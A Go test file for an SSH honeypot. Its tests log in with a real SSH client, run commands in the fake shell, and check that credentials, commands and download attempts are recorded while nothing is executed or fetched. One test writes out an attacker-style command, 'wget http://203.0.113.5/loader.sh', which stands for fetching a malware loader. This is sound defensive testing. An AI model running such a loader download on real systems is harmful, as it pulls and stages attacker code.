package ssh_test

// End-to-end proofs for the interactive SSH service: a real golang.org/x/crypto/ssh
// client drives the honeypot over the in-memory harness pipe, completing a genuine
// handshake, authenticating against the persona's per-instance password, and
// running commands through the shared shell engine. These are the tests that prove
// the headline change works: SSH is no longer a banner-and-tarpit but a coherent,
// VFS-backed shell that captures credentials and commands while executing nothing.

import (
	"crypto/ed25519"
	"crypto/rand"
	"errors"
	"io"
	"strings"
	"testing"
	"time"

	gossh "golang.org/x/crypto/ssh"

	"sweetty/internal/fakehost"
	"sweetty/internal/persona"
	"sweetty/internal/proto/ssh"
	"sweetty/internal/testharness"
)

// TestPublicKeyOfferLoggedAsCredentialNotCommand proves an offered public key is
// recorded as a credential attempt (with its fingerprint, for attribution), never
// as a shell command. Logging it as a command inflated command counts and falsely
// advanced a pubkey-spray bot, which never gets a shell, into the post-login phase.
func TestPublicKeyOfferLoggedAsCredentialNotCommand(t *testing.T) {
	h, _ := newSSH(t)

	_, priv, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatalf("generate key: %v", err)
	}
	signer, err := gossh.NewSignerFromKey(priv)
	if err != nil {
		t.Fatalf("signer: %v", err)
	}
	cfg := &gossh.ClientConfig{
		User:            "root",
		Auth:            []gossh.AuthMethod{gossh.PublicKeys(signer)},
		HostKeyCallback: gossh.InsecureIgnoreHostKey(),
		Timeout:         5 * time.Second,
	}
	// We hold no private half of the key, so the handshake must fail.
	if client, err := gossh.Dial("tcp", h.Addr(), cfg); err == nil {
		client.Close()
		t.Fatal("public-key auth should have failed; the honeypot authorizes no key")
	}

	cred, ok := h.FindEvent("CREDENTIAL")
	if !ok {
		t.Fatal("offered public key was not recorded as a CREDENTIAL event")
	}
	if cred.Note != "publickey rejected" {
		t.Errorf("note = %q, want \"publickey rejected\"", cred.Note)
	}
	if !strings.Contains(cred.Password, "SHA256:") {
		t.Errorf("credential should carry the key fingerprint, got password=%q", cred.Password)
	}
	if _, isCmd := h.FindEvent("COMMAND"); isCmd {
		t.Error("offered public key was logged as a COMMAND; it must be a CREDENTIAL")
	}
}

// newSSH spins up the interactive SSH service on a real TCP loopback listener and
// returns the harness plus the generated persona. A TCP listener (not the
// synchronous net.Pipe) is required because the SSH handshake writes from both ends
// at once, which an unbuffered pipe deadlocks.
func newSSH(t *testing.T) (*testharness.Harness, *persona.Persona) {
	t.Helper()
	p := persona.Generate()
	fs, err := fakehost.Load(p)
	if err != nil {
		t.Fatalf("load fakehost: %v", err)
	}
	h, err := testharness.NewListener(ssh.New(fs, p, ""))
	if err != nil {
		t.Fatalf("start ssh harness: %v", err)
	}
	t.Cleanup(h.Close)
	return h, p
}

// dial runs a real SSH client handshake against the honeypot listener with the
// given credentials.
func dial(t *testing.T, h *testharness.Harness, user, pass string) (*gossh.Client, error) {
	t.Helper()
	cfg := &gossh.ClientConfig{
		User:            user,
		Auth:            []gossh.AuthMethod{gossh.Password(pass)},
		HostKeyCallback: gossh.InsecureIgnoreHostKey(),
		Timeout:         5 * time.Second,
	}
	return gossh.Dial("tcp", h.Addr(), cfg)
}

// TestInteractiveExecRunsTheShell proves a full handshake + password auth + exec
// command path: `ssh root@host "<cmd>"` returns coherent VFS-backed output and the
// session is captured (credential accepted, command recorded).
func TestInteractiveExecRunsTheShell(t *testing.T) {
	h, p := newSSH(t)

	client, err := dial(t, h, "root", p.RootPassword)
	if err != nil {
		t.Fatalf("handshake/auth with the per-instance root password failed: %v", err)
	}
	defer client.Close()

	sess, err := client.NewSession()
	if err != nil {
		t.Fatalf("open session: %v", err)
	}
	out, err := sess.CombinedOutput("whoami; cat /etc/hostname; id")
	if err != nil {
		t.Fatalf("exec command: %v", err)
	}
	got := string(out)

	if !strings.Contains(got, "root") {
		t.Errorf("whoami did not report root: %q", got)
	}
	if !strings.Contains(got, p.Hostname) {
		t.Errorf("cat /etc/hostname did not return the persona host %q: %q", p.Hostname, got)
	}
	if !strings.Contains(got, "uid=0(root)") {
		t.Errorf("id did not report uid=0(root): %q", got)
	}

	// The credential was captured with an accepted verdict, and the command recorded.
	cred, ok := h.FindEvent("CREDENTIAL")
	if !ok {
		t.Fatal("no CREDENTIAL event captured for the SSH login")
	}
	if cred.Password != p.RootPassword || cred.Note != "accepted" {
		t.Errorf("credential not captured as accepted: pass=%q note=%q", cred.Password, cred.Note)
	}
	if !h.HasEvent("COMMAND") {
		t.Error("the exec'd command was not captured as a COMMAND event")
	}
}

// TestInteractiveShellSession proves the interactive `shell` path: a PTY is
// granted, a command typed at the prompt produces coherent output, and `exit`
// closes the session cleanly.
func TestInteractiveShellSession(t *testing.T) {
	h, p := newSSH(t)

	client, err := dial(t, h, "root", p.RootPassword)
	if err != nil {
		t.Fatalf("handshake/auth failed: %v", err)
	}
	defer client.Close()

	sess, err := client.NewSession()
	if err != nil {
		t.Fatalf("open session: %v", err)
	}
	if err := sess.RequestPty("xterm", 24, 80, gossh.TerminalModes{}); err != nil {
		t.Fatalf("request pty: %v", err)
	}
	stdout, err := sess.StdoutPipe()
	if err != nil {
		t.Fatalf("stdout pipe: %v", err)
	}
	stdin, err := sess.StdinPipe()
	if err != nil {
		t.Fatalf("stdin pipe: %v", err)
	}
	if err := sess.Shell(); err != nil {
		t.Fatalf("start shell: %v", err)
	}
	// Type a command, then exit, terminating each line with a bare CR exactly as a
	// real PTY client does on Enter (it does not send LF). This exercises the
	// server-side line discipline; if the shell only accepted LF, it would hang here.
	// Reading stdout to EOF deterministically collects the whole transcript.
	stdin.Write([]byte("whoami\r"))
	stdin.Write([]byte("exit\r"))
	out, err := io.ReadAll(stdout)
	if err != nil {
		t.Fatalf("read shell output: %v", err)
	}
	if err := sess.Wait(); err != nil {
		t.Fatalf("waiting for shell to close: %v", err)
	}

	got := string(out)
	if !strings.Contains(got, "Welcome to "+p.PrettyName) {
		t.Errorf("interactive shell did not print the persona welcome: %q", got)
	}
	// The command is echoed back (the server cooks the PTY), and runs.
	if !strings.Contains(got, "whoami") {
		t.Errorf("typed command was not echoed back to the PTY client: %q", got)
	}
	if !strings.Contains(got, "root") {
		t.Errorf("interactive whoami did not report root: %q", got)
	}
}

// TestWrongPasswordRejected proves a credential the persona does not recognise is
// refused at the handshake and still captured with a rejected verdict, so the shell
// is never reached by a bad login but the attempt is not lost.
func TestWrongPasswordRejected(t *testing.T) {
	h, p := newSSH(t)

	wrong := p.RootPassword + "-nope"
	if _, err := dial(t, h, "root", wrong); err == nil {
		t.Fatal("a wrong password was accepted; the SSH service is waving logins through")
	}

	// The rejected attempt is captured.
	var found bool
	for _, e := range h.Entries() {
		if e.Event == "CREDENTIAL" && e.Password == wrong {
			found = true
			if e.Note != "rejected" {
				t.Errorf("wrong password not marked rejected: note=%q", e.Note)
			}
		}
	}
	if !found {
		t.Error("the rejected SSH login attempt was not captured as a CREDENTIAL event")
	}
}

// TestUnknownUserRejected proves an account that does not exist on the host cannot
// authenticate even with an otherwise-valid-looking password, matching real PAM
// behaviour (unknown user is refused identically to a bad password).
func TestUnknownUserRejected(t *testing.T) {
	h, p := newSSH(t)
	if _, err := dial(t, h, "nonexistent", p.RootPassword); err == nil {
		t.Fatal("an unknown username authenticated; only real host accounts must log in")
	}
}

// TestExecReportsExitStatus proves `ssh host "<cmd>"` returns the command's real
// exit status rather than a hardcoded zero: a failing command exits non-zero and a
// succeeding one exits zero, so a bot that chains on the result behaves correctly.
func TestExecReportsExitStatus(t *testing.T) {
	h, p := newSSH(t)
	client, err := dial(t, h, "root", p.RootPassword)
	if err != nil {
		t.Fatalf("auth failed: %v", err)
	}
	defer client.Close()

	s1, err := client.NewSession()
	if err != nil {
		t.Fatalf("open session: %v", err)
	}
	err = s1.Run("false")
	var ee *gossh.ExitError
	if !errors.As(err, &ee) {
		t.Fatalf("`false` should report a non-zero exit, got %v", err)
	}
	if ee.ExitStatus() != 1 {
		t.Errorf("`false` exit status = %d, want 1", ee.ExitStatus())
	}

	s2, err := client.NewSession()
	if err != nil {
		t.Fatalf("open session: %v", err)
	}
	if err := s2.Run("true"); err != nil {
		t.Errorf("`true` should exit 0, got %v", err)
	}
}

// TestSSHExecCapturesIntentWithoutFetching proves the safety doctrine on the SSH
// path: a download command run over `ssh host "wget <url>"` records the target as a
// DOWNLOAD_ATTEMPT (intent captured) while fetching nothing. The structural
// guarantee that no fetch is even possible lives in internal/safety; this is the
// behavioural counterpart over a real SSH session.
func TestSSHExecCapturesIntentWithoutFetching(t *testing.T) {
	h, p := newSSH(t)
	client, err := dial(t, h, "root", p.RootPassword)
	if err != nil {
		t.Fatalf("auth failed: %v", err)
	}
	defer client.Close()
	sess, err := client.NewSession()
	if err != nil {
		t.Fatalf("open session: %v", err)
	}

	const url = "http://203.0.113.5/loader.sh"
	// The exec may exit non-zero (a real wget that fetches nothing fails); the point
	// is that the attempt is captured, not that the command "succeeds".
	_, _ = sess.CombinedOutput("wget " + url)

	ev, ok := h.WaitEvent("DOWNLOAD_ATTEMPT", 2*time.Second)
	if !ok {
		t.Fatal("wget over SSH exec did not capture a DOWNLOAD_ATTEMPT")
	}
	if !strings.Contains(ev.URL+" "+ev.Command+" "+ev.Host, "203.0.113.5") {
		t.Errorf("download event did not capture the attacker's target: %+v", ev)
	}
}
